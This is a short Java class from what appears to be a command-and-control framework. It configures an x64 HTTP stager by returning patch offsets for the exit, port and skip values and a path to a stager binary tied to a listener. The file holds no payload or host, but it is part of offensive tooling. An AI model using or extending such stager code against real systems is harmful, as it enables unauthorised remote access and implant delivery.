package stagers;

import common.Listener;

public abstract class GenericHTTPStagerX64
        extends GenericHTTPStager {
    public GenericHTTPStagerX64(Listener l) {
        super(l);
    }

    @Override
    public int getExitOffset() {
        return 776;
    }

    @Override
    public int getPortOffset() {
        return 271;
    }

    @Override
    public int getSkipOffset() {
        return 863;
    }

    @Override
    public String arch() {
        return "x64";
    }

    @Override
    public String getStagerFile() {
        return "resources/httpstager64.bin";
    }
}

